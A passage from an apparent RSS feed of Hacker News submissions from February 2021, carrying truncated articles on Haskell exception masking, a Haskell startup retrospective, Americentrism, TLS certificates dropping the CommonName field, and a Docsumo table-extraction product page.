<span id="cb6-6">  mask <span>$</span> \restore <span>-&gt;</span> <span>do</span></span>
<span id="cb6-7">    a <span>&lt;-</span> before</span>
<span id="cb6-8">    r <span>&lt;-</span> restore (thing a) <span>`onException`</span> after a</span>
<span id="cb6-9">    _ <span>&lt;-</span> after a</span>
<span id="cb6-10">    <span>return</span> r</span></code></pre></div>
<p>The version used by <a href="https://hackage.haskell.org/package/unliftio-0.2.13.1/docs/UnliftIO-Exception.html#v:bracket">unliftio</a> and <a href="https://hackage.haskell.org/package/safe-exceptions-0.1.7.1/docs/Control-Exception-Safe.html#v:bracket">safe-exceptions</a> are both implemented using <code>try</code> but the crucial difference is that they are using <code>uninterruptibleMask</code> when executing the <code>after</code> callback. Since they are using <code>uninterruptibleMask</code> they need to use <code>try</code> to avoid blocking exceptions when executing the <code>before</code> handler. This is to minimize time when a thread is in <code>MaskedUninterruptible</code> state.</p>
<p>Let us look at the most common resource handlers:</p>
<h4 id="file-handles">File Handles</h4>
<p>The <a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/GHC-IO-Handle.html#t:Handle">base</a> package does not export <code>Handle</code> constructors, they are an implementation detail, so let‚Äôs bring the definition here:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>data</span> <span>Handle</span></span>
<span id="cb7-2">  <span>=</span> <span>FileHandle</span>           <span>-- A normal handle to a file</span></span>
<span id="cb7-3">        <span>FilePath</span>         <span>-- the file (used for error messages</span></span>
<span id="cb7-4">                         <span>-- only)</span></span>
<span id="cb7-5">        <span>!</span>(<span>MVar</span> <span>Handle__</span>)</span>
<span id="cb7-6"></span>
<span id="cb7-7">  <span>|</span> <span>DuplexHandle</span>         <span>-- A handle to a read/write stream</span></span>
<span id="cb7-8">        <span>FilePath</span>         <span>-- file for a FIFO, otherwise some</span></span>
<span id="cb7-9">                         <span>--   descriptive string (used for error</span></span>
<span id="cb7-10">                         <span>--   messages only)</span></span>
<span id="cb7-11">        <span>!</span>(<span>MVar</span> <span>Handle__</span>) <span>-- The read side</span></span>
<span id="cb7-12">        <span>!</span>(<span>MVar</span> <span>Handle__</span>)</span></code></pre></div>
The <code><a href="https://hackage.haskell.org/package/base/docs/GHC-IO-Handle.html#v:hClose">hClose</a> :: Handle -&gt; IO ()</code> calls <code><a href="https://hackage.haskell.org/package/base/docs/src/GHC.IO.Handle.html#hClose%27">hClose‚Äô</a></code> which masks exceptions while calling <code>takeMVar</code> (in <code><a href="https://hackage.haskell.org/package/base/docs/src/GHC.IO.Handle.Internals.html#withHandle%27">withHandle‚Äô</a></code>), and continues (while exceptions are masked) with <code><a href="https://hackage.haskell.org/package/base/docs/src/GHC.IO.Handle.Internals.html#hClose_help">hClose_help</a></code>, which does a few interesting things:
<ul>
<li>
flush a buffer,
</li>
<li>
close a decoder,
</li>
<li>
call <code><a href="https://hackage.haskell.org/package/base/docs/GHC-IO-Device.html#v:close">GHC.IO.Device.close</a></code> to close the file descriptor.
</li>
</ul>
<p>Flushing file handle buffer is done by either safe (non-threaded rts) or unsafe (threaded rts) ffi call (using <code><a href="https://hackage.haskell.org/package/base/docs/src/System.Posix.Internals.html#c_write">c_write</a></code> or <code><a href="https://hackage.haskell.org/package/base/docs/src/System.Posix.Internals.html#c_safe_write">c_safe_write</a></code>), and thus is uninterruptible. Closing the decoder is either a no-op (<code>return ()</code>) or an unsafe foreign call to <code>iconv_close</code>. We are left with analysing <code><a href="https://hackage.haskell.org/package/base/docs/GHC-IO-Device.html#v:close">GHC.IO.Device.close</a></code>. <code>Handle__</code> is using <code>IODevice</code> <code>FD</code> instance. On systems that support either <code>epoll</code>, <code>poll</code> or <code>kqueue</code> (e.g.&nbsp;on <code>Linux</code>, <code>MacOS</code>, <code>FreeBSD</code>, and alikes) it is done via event manager. On other operating systems (<code>Windows</code>) closing file handle is done by a direct foreign call (this might change in the future with the new <code>mio</code> Windows event manager based on I/O completion ports). When event manager is involved, the <code><a href="https://hackage.haskell.org/package/base/docs/GHC-Conc-IO.html#v:closeFdWith">closeFdWith</a></code> is used. I recently fixed a bug which made it interruptible, see <a href="https://gitlab.haskell.org/ghc/ghc/-/merge_requests/4942">PR #4942</a>. However, because calls which involve <code>epoll</code> are very fast all the blocking operations done by <code>closeFdWith</code> would block for a very short time, making it quite unlikely to be an issue ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://coot.me/posts/mask.html">https://coot.me/posts/mask.html</a></em></p>]]>
            </description>
            <link>https://coot.me/posts/mask.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26177194</guid>
            <pubDate>Thu, 18 Feb 2021 07:56:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reflections on Using Haskell for My Startup]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 98 (<a href="https://news.ycombinator.com/item?id=26176940">thread link</a>) | @_query
<br/>
February 17, 2021 | https://alistairb.dev/reflections-on-haskell-for-startup/ | <a href="https://web.archive.org/web/*/https://alistairb.dev/reflections-on-haskell-for-startup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Almost exactly one year ago I quit my job to create a Haskell startup as a solo developer. I had about 20 ideas, but eventually settled on the idea of dependency project health tracking with <a href="https://deadpendency.com/" target="_blank" rel="noopener">Deadpendency</a>.</p>

<p>This post describes the experience and evaluates Haskell and its ecosystem.</p>

<p><small>Disclaimer: This blog post contains a bunch of memes. They are trying to be humorous, not accurate or fair üòâ.</small></p>

<h2 id="why-haskell">Why Haskell?</h2>

<p>Since about 2016 I have had a strong <del>obsession</del> love of Haskell. Prior to learning Haskell, I was an experienced OO style developer but I didn‚Äôt really know how to keep improving my raw programming ability. Haskell introduced me to the world of functional programming (FP) which has an almost infinite depth of concepts to learn, which do actually help improve code quality and application architecture.</p>

<p><img width="400" src="https://i.imgflip.com/4x9eeq.jpg" alt="I should learn functional programming meme"></p>

<p>Haskell is challenging to learn, but extremely fun to write. For my own learning and pleasure, if my startup succeeds, I want to be doing Haskell.</p>

<p>Additionally, I think Haskell is the best general purpose programming language (that you can use in production). In particular, Haskell excels at writing ‚Äòboring‚Äô business applications which is typically what I work on. <a href="https://www.foxhound.systems/blog/why-haskell-for-production/" target="_blank" rel="noopener">‚ÄòWhy Haskell For Production‚Äô</a> goes into more detail on the benefits Haskell offers.</p>

<p><img width="400" src="https://i.imgflip.com/4x9fwz.jpg" alt="Haskell is the best change my mind meme"></p>

<h2 id="the-setup-phase">The Setup Phase</h2>

<p>Probably the most challenging part was building out a skeleton architecture to hang my business logic on. I decided to go with, even within Haskell, fairly advanced libraries of <a href="https://docs.servant.dev/en/stable/" target="_blank" rel="noopener"><code>servant</code></a> and <a href="https://hackage.haskell.org/package/fused-effects" target="_blank" rel="noopener"><code>fused-effects</code></a>.</p>

<p>I spent a fair amount of time banging my head against a wall trying to get these libraries to work nicely together. This was primarily from a lack of Haskell ability on my part. I had prepared as best I could, but Haskell is deep and I needed to learn more to work day to day with it. I was lucky enough to eventually find <a href="https://github.com/mitchellwrosen/hspolls" target="_blank" rel="noopener">an example</a> that marries these two libraries together, which was a life saver. I‚Äôm sure I would have gotten there eventually, but I was in a bit over my head at that point.</p>

<p><img width="400" src="https://i.imgflip.com/4x9j14.jpg" alt="Haskell with servant fused-effects is hard meme"></p>

<p>Haskell is awesome, but like most languages there is cruft and legacy to be avoided. Haskell has a standard library known as <a href="https://hackage.haskell.org/package/base" target="_blank" rel="noopener"><code>base</code></a> which unfortunately has a fair amount of unsafe or unperformant functions included. As such I went with an alternative standard library <a href="https://hackage.haskell.org/package/relude" target="_blank" rel="noopener"><code>relude</code></a> that builds on and improves <code>base</code>. On top of this, there are many core libraries that are not part of the standard library I wanted to use and have nice patterns around.</p>

<p>Additionally, I was <a href="https://alistairb.dev/haskell-on-google-cloud-is-great">deploying to google cloud</a> and so needed to figure out good patterns for that integration from Haskell.</p>

<p>This setup effort was quite challenging. I spent most of it squinting at compiler errors. Yet it only took about 2 weeks to have a good foundation of code to start building my business logic upon.</p>

<h2 id="building-it-out">Building it Out</h2>

<p>This is when it started to get really fun. I had my core patterns set out and I could focus on building a pipeline. The day in day out of writing out my logic as small pure functions that I composed together was very nice.</p>

<p>Haskell has such impressive auto-magic code generation techniques that you spend much more time focused on the interesting logic of your application rather than boilerplate.</p>

<div><div><pre><code><span>data</span> <span>HappinessLevel</span> <span>=</span>
    <span>Miserable</span>
  <span>|</span> <span>Sad</span>
  <span>|</span> <span>Average</span>
  <span>|</span> <span>Happy</span>
  <span>|</span> <span>HaskellDeveloper</span>
  <span>deriving</span> <span>(</span><span>Show</span><span>,</span> <span>Eq</span><span>,</span> <span>Ord</span><span>,</span> <span>Bounded</span><span>,</span> <span>Enum</span><span>,</span> <span>ToJSON</span><span>,</span> <span>FromJSON</span><span>)</span> <span>-- magic code generation</span>

<span>-- ok not really magic, think 'convention over configuration'</span>
<span>-- where you can have generated sane defaults, or customise if you like</span>
</code></pre></div></div>

<p>And personally I think Haskell is quite beautiful to read and write. #notbiased</p>

<h3 id="parsing-libraries">Parsing Libraries</h3>

<p>A lot of the logic of Deadpendency is parsing. Either parsing dependency files or parsing various API responses. Haskell has many excellent parsing libraries, most notably <a href="https://hackage.haskell.org/package/aeson" target="_blank" rel="noopener"><code>aeson</code></a> for JSON.</p>

<p>Why is this nice in Haskell? The ‚Äòmonad‚Äô abstraction is excellent for dealing with code with a lot of failure conditions (ie. parsing) and avoids ‚Äòpyramid of doom‚Äô type code. Haskell worked out really well in this key area.</p>

<p><img width="400" src="https://alistairb.dev/images/hadouken.jpeg" alt="Pyramid of doom meme"></p>

<h3 id="testing">Testing</h3>

<p>Another strong positive for writing Deadpendency was testing. Haskell has a lesser-known style of testing libraries that do ‚Äòproperty based testing‚Äô (PBT).</p>

<p>PBT allows you to write value generators for your data types, which you use to generate 100s or 1000s of test cases. Then, you run these generated values against some function and check that certain properties hold.</p>

<p>For example, part of the Deadpendency logic is generating an HTML report at the end. I had some <code>toHtml :: Report -&gt; HTML</code> function that I wanted to test. So I wrote a <code>fromHtml :: HTML -&gt; Report</code> function where it goes the other way (ok writing that was pretty painful). Then my PBT test will generate 100s of <code>Report</code> values and check that <code>report == fromHtml (toHtml report)</code> (this is known as ‚Äòroundtrip testing‚Äô). With this single test I was able to find many edge case bugs with my HTML report generation logic.</p>

<p><img width="400" src="https://i.imgflip.com/4x9tqj.jpg" alt="Haskell with servant fused-effects is hard meme"></p>

<p>PBT exists in some other languages, but it originated (I believe?) in Haskell so the libraries are excellent.</p>

<h3 id="not-actively-maintained-libraries">Not Actively Maintained Libraries</h3>

<p>A big challenge of working with Haskell was the lack of well-maintained libraries. Ironically, of the 75 (!) packages I depend upon 19 are flagged by Deadpendency as unhealthy (deprecated or inactive). This means I often don‚Äôt have the luxury of asking library maintainers to fix bugs. Even if I PR a fix, sometimes that PR will be ignored for months.</p>

<p>This I think is the reality of using a niche language like Haskell. To be clear, I do not think library developers owe me anything, but it is nonetheless a downside when compared to more popular languages.</p>

<p><img width="400" src="https://i.imgflip.com/4x9xjq.jpg" alt="Haskell not actively maintained meme"></p>

<p>Thankfully Haskell build tools have good support for loading a package from git. This means you can PR some bug fix or feature and immediately use your fork to work around the problem.</p>

<h3 id="compile-times-were-fine">Compile Times.. Were Fine</h3>

<p>I thought I‚Äôd call this out as it is a common complaint I see around Haskell. I followed some <a href="https://www.parsonsmatt.org/2019/11/27/keeping_compilation_fast.html" target="_blank" rel="noopener">good advice</a> which kept compilation fast (aside from <a href="https://twitter.com/AlistairBuzz/status/1253507016242294784" target="_blank" rel="noopener">one interesting edge case I resolved</a>).</p>

<ul>
  <li>Number of modules (Haskell source files) - 509</li>
  <li>Number of lines of Haskell - 20090</li>
  <li>Number of dependencies - 75</li>
  <li>Dell 9570 XPS Laptop - (Hex core - 8th-gen Intel Core i7-8750H CPU), 32GB memory</li>
</ul>

<p>So what are the numbers?</p>

<h4 id="compile-dependencies-from-scratch">Compile dependencies from scratch</h4>

<p>Time: 17m44s</p>

<p>This is compiling all application dependencies, which needs to be done before you can compile your application code. Rebuilding all from scratch rarely happens as both my dev machines and CI will cache and only rebuild what has changed.</p>

<p>You do sometimes update a very core package which triggers a lot of dependent packages to recompile which can take a while. Although, I usually do dependency updates at the start of the day while I‚Äôm sipping my coffee, so usually don‚Äôt notice.</p>

<h4 id="compile-app-including-tests-in-development">Compile app (including tests) in development</h4>

<p>Time: 1m1s</p>

<p>Likewise, due to caching a full recompilation rarely happens. As such, most code edits do not trigger many modules to be recompiled and it is fast.</p>

<p>Additionally, Haskell has nice ‚Äòcontinuous compilation‚Äô tools that fire on save. Usually by the time I actually look at my terminal compilation is already done.</p>

<h4 id="compile-app-for-deployment">Compile app for deployment</h4>

<p>with <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/using-optimisation.html" target="_blank" rel="noopener">full optimisations</a> (-02).</p>

<p>Time: 2m53s</p>

<p>This typically runs in CI. It runs in parallel with a host of other checks such as running my tests, which also take a few minutes. Due to this, the time doesn‚Äôt really impact the build + deploy time too much.</p>

<p><img width="400" src="https://i.imgflip.com/4xp4zu.jpg" alt="Compile times meme"></p>

<h3 id="refactoring-pain">Refactoring Pain</h3>

<p>Deadpendency is relatively simple in what it does, but there is a lot of hidden complexity to the problem. Which is to say, it is like 99% of applications üòâ. When developing it I was constantly realising I had modelled things a bit too simplistically and would need to refactor.</p>

<p>Haskell is very safe to refactor thanks to the type safety the compiler brings, which is probably the most important thing. However, Haskell does not have great tools to help with refactoring, at least in terms of the restructuring changes I kept making. The <a href="https://hackage.haskell.org/package/apply-refact" target="_blank" rel="noopener">existing</a> <a href="https://hackage.haskell.org/package/retrie" target="_blank" rel="noopener">tools</a> seem more geared towards complex rewriting of common code, not restructuring modules or renaming identifiers.</p>

<p>As such I did it all manually with text search replace, or just change something and fix all the new compiler errors. This was a bit of a grind and it caused me to delay needed refactoring sometimes.</p>

<p>It‚Äôs a pity Haskell doesn‚Äôt have the refactoring tools to help in this situation. The dream would be these tools integrated into an IDE.</p>

<p><img width="400" src="https://i.redd.it/dbdshzzflgd31.jpg" alt="Haskell had an IDE meme"></p>

<p>(Stolen from <a href="https://www.reddit.com/r/ProgrammerHumor/comments/cjtbfj/society_if_haskell_has_ide/" target="_blank" rel="noopener">reddit</a>)</p>

<p>Having said that, it should be noted that Haskell does have an excellent IDE now in the form of <a href="https://github.com/haskell/haskell-language-server" target="_blank" rel="noopener">Haskell Language Server</a> (HLS). The momentum around the project is insane and I applaud the developers. One fixed pain point from HLS is it does auto imports now, which used to greatly contribute to the friction of working with Haskell. I‚Äôm sure Haskell will get there eventually.</p>

<h3 id="waiting-for-new-ghc-versions-to-be-usable">Waiting for New GHC Versions to be Usable</h3>

<p>This is mostly me complaining for the sake of it, but as someone pretty obsessed with both new shiny versions of things and Haskell, waiting for new GHC (GHC is the Haskell compiler) versions to be usable has been painful. There is a long tail of libraries and platforms that need to be updated before I can use a new GHC version. Sometimes these updates can drag a lot.</p>

<p>For example GHC 9 was just released, but I still haven‚Äôt been able to upgrade to GHC 8.10 yet which was first released in March 2020.</p>

<p><img width="500" src="https://i.imgflip.com/4xebid.jpg" alt="GHC releases meme"></p>

<h2 id="launching">Launching</h2>

<p>So after about 8 months of work I was ready to start getting users. I slowly soft launched, promoting it in a few small channels. How did my Haskell fair in prod?</p>

<h3 id="very-few-logic-bugs">Very Few Logic Bugs</h3>

<p>My core Haskell had very few logic bugs. This is because Haskell is very safe by default and I had opted into strict types that help catch edge cases.</p>

<p>For example, I was using a lot of <a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/Data-List-NonEmpty.html" target="_blank" rel="noopener"><code>NonEmpty</code></a> lists which the compiler will guarantee is not empty. To use them you must specify how to handle the empty case. ie. what do I do if Deadpendency can‚Äôt find any dependencies to check?</p>

<p>And of course, I had ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://alistairb.dev/reflections-on-haskell-for-startup/">https://alistairb.dev/reflections-on-haskell-for-startup/</a></em></p>]]>
            </description>
            <link>https://alistairb.dev/reflections-on-haskell-for-startup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26176940</guid>
            <pubDate>Thu, 18 Feb 2021 07:17:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Americentrism]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26176606">thread link</a>) | @jlelse
<br/>
February 17, 2021 | https://jlelse.blog/thoughts/2021/02/americentrism | <a href="https://web.archive.org/web/*/https://jlelse.blog/thoughts/2021/02/americentrism">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Wikipedia has an article on a phenomenon I often observe on the Internet, such as on Hacker News: <a href="https://en.wikipedia.org/wiki/List_of_countries_in_the_Americas_by_population" target="_blank" rel="noopener">Americentrism</a>.</p><blockquote><p><strong>Americentrism</strong>, also known as <em>American-centrism</em> or <em>US-centrism</em>, is a tendency to assume the culture of the United States is more important than those of other countries or to judge foreign cultures based on American cultural standards. It refers to the practice of viewing the world from an overly US-focused perspective, with an implied belief, either consciously or subconsciously, in the preeminence of American culture.</p></blockquote><p>But even that word in itself, I think (as an European), contains U.S. bias: America is equated with the USA, but there are <a href="https://en.wikipedia.org/wiki/List_of_countries_in_the_Americas_by_population" target="_blank" rel="noopener">so many more countries in America</a>.</p><p>Is it just me who thinks like that?</p></div></div>]]>
            </description>
            <link>https://jlelse.blog/thoughts/2021/02/americentrism</link>
            <guid isPermaLink="false">hacker-news-small-sites-26176606</guid>
            <pubDate>Thu, 18 Feb 2021 06:22:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced Git Features You Didn‚Äôt Know You Needed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26176469">thread link</a>) | @zdw
<br/>
February 17, 2021 | https://martinheinz.dev/blog/43 | <a href="https://web.archive.org/web/*/https://martinheinz.dev/blog/43">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://martinheinz.dev/blog/43</link>
            <guid isPermaLink="false">hacker-news-small-sites-26176469</guid>
            <pubDate>Thu, 18 Feb 2021 05:58:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TLS certificates specifying hosts via the CommonName field is more or less gone]]>
            </title>
            <description>
<![CDATA[
Score 70 | Comments 22 (<a href="https://news.ycombinator.com/item?id=26176448">thread link</a>) | @zdw
<br/>
February 17, 2021 | https://utcc.utoronto.ca/~cks/space/blog/tech/TLSCertificateCNMostlyGone | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/tech/TLSCertificateCNMostlyGone">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>TLS certificates specifying hosts via their CommonName field is more or less gone</h2>

	<p><small>February 17, 2021</small></p>
</div><div><p><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TLS</a>
certificates for hosts and domains must somehow identify what
hostname (or names) they're for. Historically <a href="https://utcc.utoronto.ca/~cks/space/blog/tech/TLSCertificatesNamingHosts">there have been two
ways to do this</a>. The first way was a
specific sub-field, the <em>CN</em> or CommonName, of the certificate's
overall <em>Subject Name</em>. This had the problem that it could only
have one name. When people started wanting to have TLS certificates
that covered more than one name, they invented another mechanism,
the <em>Subject Alternative Name</em> (SAN) extension.</p>

<p>As a practical matter, all vaguely modern software that wants to
properly validate TLS certificates has supported (and often preferred)
Subject Alternative Names for some time. A great many TLS certificates
in the wild are for multiple hosts and it's generally unlikely that the
host you're connecting to is the one name that the system chose to put
in the CN field; software that only supports CN cannot validate those
TLS certificates. As a matter of timing, SANs have been theoretically
mandatory since 2002 and checking only SANs has been theoretically
required since 2011 (which means that since 2011 or earlier, the CN was
supposed to always be one of the SANs).</p>

<p>These days, any remaining support for looking at TLS certificate
CommonName to validate TLS certificates is getting more and more
extinct (and more so than I expected when I started writing this
entry). In the browser realm, <a href="https://www.chromestatus.com/feature/4981025180483584">Chrome apparently turned it off in
58, released in 2017</a>, and then
threw out the option to check it again in Chrome 65 (from the comment
on <a href="https://utcc.utoronto.ca/~cks/space/blog/tech/TLSCertificatesNamingHosts">my old entry</a>, which was ironically
written shortly before Chrome did this). Firefox is said to have
removed support in version 48, from August of 2016. <a href="https://support.apple.com/en-ca/HT210176">Safari
apparently stopped looking at CommonName in iOS 13 and macOS 10.15</a>, which I believe date
from late 2019. <a href="https://go-review.googlesource.com/c/go/+/231379">This Go change</a> also talks about
how browsers removed it in 2019 ('last year' for a mid 2020 change).</p>

<p>In non-browser TLS code, Go started ignoring CN by default in
Go 1.15 (released in August of 2020) and this will be the only
option starting in Go 1.17 (to be released in August of 2021),
per <a href="https://golang.org/doc/go1.16#crypto/x509">here</a>. Since
Firefox doesn't support CN any more, I assume that <a href="https://en.wikipedia.org/wiki/Network_Security_Services">NSS</a> doesn't
either, since NSS is basically Firefox's underlying TLS implementation.
I have no idea what other TLS libraries are doing, but I would expect
that many of them will support CommonName for some time to come; TLS
libraries are historically behind browser practices.  Hopefully they
are all following the 2011 requirement to check only SANs when SANs are
present (which they should always be in public certificates).</p>

<p>Probably TLS certificates will continue to contain CommonName fields
for a long time to come. Having a <em>Subject Name</em> in general is
common (although apparently not actually required) and the CN is a
standard (although not required) part of the Subject Name, so you
might as well throw it in. Even Mozilla and Let's Encrypt (still)
have TLS certificates with CNs. However, since I checked this now,
the current <a href="https://cabforum.org/">CA/Browser Forum</a> <a href="https://cabforum.org/baseline-requirements-documents/">baseline
requirements</a>
(version 1.7.3) allow but don't require CommonName (section 7.1.4.2.2,
which says that it's 'discouraged, but not prohibited'). Given how
conservative most Certificate Authorities are, I expect them to be
issuing TLS certificates with CommonName fields until they're
required to stop.</p>

<p>(An interested party could scan Certificate Transparency logs to see if
there were very many issued certificates without CNs. Probably there are
some; someone must have tried it out at some point through an official
CA.)</p>

<p>PS: <a href="https://no-common-name.badssl.com/">no-common-name.badssl.com</a>
has a TLS certificate without a CN, or at least it's supposed to
(<a href="https://community.letsencrypt.org/t/how-to-obtain-a-cert-without-a-common-name/72807/6">via</a>),
but the TLS certificate is expired right now as I write this entry
so it's hard to test how client software behaves. <a href="https://community.letsencrypt.org/t/compatibility-testing-of-no-common-name/72863">See also</a>,
which pointed me to <a href="https://no-subject.labs.vu.nl/">no-subject.labs.vu.nl</a>,
which has a currently valid TLS certificate with no <em>Subject Name</em> at all.</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/tech/TLSCertificateCNMostlyGone</link>
            <guid isPermaLink="false">hacker-news-small-sites-26176448</guid>
            <pubDate>Thu, 18 Feb 2021 05:54:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Consentful Tech Zine [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26176065">thread link</a>) | @conanxin
<br/>
February 17, 2021 | http://www.consentfultech.io/wp-content/uploads/2019/10/Building-Consentful-Tech.pdf | <a href="https://web.archive.org/web/*/http://www.consentfultech.io/wp-content/uploads/2019/10/Building-Consentful-Tech.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.consentfultech.io/wp-content/uploads/2019/10/Building-Consentful-Tech.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26176065</guid>
            <pubDate>Thu, 18 Feb 2021 05:03:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The questionable use of AI for job applications]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26175871">thread link</a>) | @shirappu
<br/>
February 17, 2021 | https://web.br.de/interaktiv/ki-bewerbung/en/ | <a href="https://web.archive.org/web/*/https://web.br.de/interaktiv/ki-bewerbung/en/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://web.br.de/interaktiv/ki-bewerbung/en/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26175871</guid>
            <pubDate>Thu, 18 Feb 2021 04:38:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Extract Tables by Docsumo]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26175273">thread link</a>) | @amitness
<br/>
February 17, 2021 | https://docsumo.com/free-tools/extract-tables-from-pdf-images | <a href="https://web.archive.org/web/*/https://docsumo.com/free-tools/extract-tables-from-pdf-images">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-tool"><div><div><p>Automated table extraction from pdf &amp; images</p><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>It doesn't support in mobile view. <br>You can copy the link and view it in your desktop.</p></div><div id="rating-section"><div id="rating-block"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div></div></div></div></div><div><p>How it works?</p><div><div><p><img src="https://assets.website-files.com/5f605b07a820602f886fc4ba/5faa7831743ca77a6aa3ee11_Choose%20File.png" loading="lazy" width="93" alt=""></p><div><p>1. Choose File</p><p>Select or drop the files you want to convert.<br></p></div></div><div><p><img src="https://assets.website-files.com/5f605b07a820602f886fc4ba/5faa628aeb96926ffa789a4f_edit%20%20and%20review.png" loading="lazy" width="101" alt=""></p><div><p>2. Edit &amp; Review</p><p>Review the extracted information in the review panel and make changes if needed.</p></div></div><div><p><img src="https://assets.website-files.com/5f605b07a820602f886fc4ba/5faa629ae8714b4bf57f0719_Convert%20%26%20Download.png" loading="lazy" width="101" alt=""></p><div><p>3. Convert &amp; Download</p><p>Download the converted file. Right after that, the input file is removed from our server.</p></div></div></div></div><div><p>Extract tables from PDF/Images</p><p>Save your crucial time and prevent any error from occurring with Docsumo's free table extraction from a PDF/Image tool. With this tool, extract tables from PDF documents and images in real-time with 100% accuracy.</p></div><div><p>Questions we often hear</p><p>Let's look at the answers</p><div><div role="list"><div role="listitem"><div><div><div><h4>Why do I need to extract tables from a PDF document?</h4></div><p>Tables are cleaner data format, and often you need only the data from tables embedded in a pdf document. That's why, businesses find it useful to extract tables from pdf documents and process the data.</p></div></div></div><div role="listitem"><div><div><div><h4>Do I need to train this free table extractor from pdf tool?</h4></div><p>The efficiency of Artificial Intelligence and Machine Learning technology improves with number of sample documents processed. So, it is highly recommended to have at least couple of sample documents ready for training.</p></div></div></div><div role="listitem"><div><div><div><h4>What fields does it capture?</h4></div><p>The tool lets you capture any text based field. The tool allows you to review the extracted data before downloading the output.</p></div></div></div><div role="listitem"><div><div><div><h4>Can I convert my document without installing the software?</h4></div><p>Documo's free online OCR tool is capable of processing any document online with complete accuracy. So, there is no need to install the tool on your system.</p></div></div></div><div role="listitem"><div><div><div><h4>Is my data secure with Docsumo?</h4></div><p>Docsumo doesn't sell or share your data to any third-party person or organization. Your data is completely secure and confidential.</p></div></div></div><div role="listitem"><div><div><div><h4>Is there any limit on using the tool?</h4></div><p>There's no usage limit on our free tool. No payment required and no credit card details needed. Sign up with us to get access to more of our resources.</p></div></div></div></div></div></div><div><h2>What Our Customers Are Saying</h2><div><div data-animation="slide" data-nav-spacing="4" data-duration="500" data-infinite="1"><div><div><div><p><img src="https://assets.website-files.com/5f605b07a820602f886fc4ba/5f61bd1ba58812799fe2bd13_paysense.svg" loading="lazy" height="" alt=""></p><p>‚ÄúWe are using Docsumo‚Äôs APIs for automating data capture from bank statements and identity cards while on-boarding customers. It has reduced the time our operations team spends on data entry by manifolds while providing a much better customer experience.‚Äù</p><p>Prashanth Ranganathan</p><p>CEO, Paysense.com</p></div></div><div><div><p><img src="https://assets.website-files.com/5f605b07a820602f886fc4ba/5f61bd1b531b085edc6c1cbf_Onez.jpeg" loading="lazy" height="" width="25" alt=""></p><p>Since the very beginning everything was fine, they always say ‚ÄúAsk anything even if you need support from our developers. The support for initial user was exceptional, even for small users like me.</p><div><p>Dario G</p><p>Operations Manager, Onerz</p></div></div></div><div><div><p><img src="https://assets.website-files.com/5f605b07a820602f886fc4ba/5f61bd1bf817cf304f90e758_dhanwise.svg" loading="lazy" height="" alt=""></p><p>"With Docsumo we were able to automate invoice processing completely. It has reduced invoice processing time from hours to minutes. Since there is no data entry required, our data extraction accuracy has improved. We highly recommend Docsumo to everyone. "</p><p>Subodh Malgonde</p><p>CEO, DhanWise.com</p></div></div></div></div></div><a href="https://docsumo.com/case-studies"><p>View more Customers Stories</p><img src="https://assets.website-files.com/5f605b07a820602f886fc4ba/5f62f7ab382b1fa34db4108a_arrow.svg" loading="lazy" height="" alt=""></a></div><div id="free-trial-form"><div><div><div><h2>Start your free trial</h2><p>We‚Äôd love to show you how you can increase your productivity, process your documents faster and save operations cost!</p></div></div><div><div><div id="formId"><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://docsumo.com/free-tools/extract-tables-from-pdf-images</link>
            <guid isPermaLink="false">hacker-news-small-sites-26175273</guid>
            <pubDate>Thu, 18 Feb 2021 03:29:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[40 Year History of Opposition to Nuclear Power in California]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 40 (<a href="https://news.ycombinator.com/item?id=26175253">thread link</a>) | @Lammy
<br/>
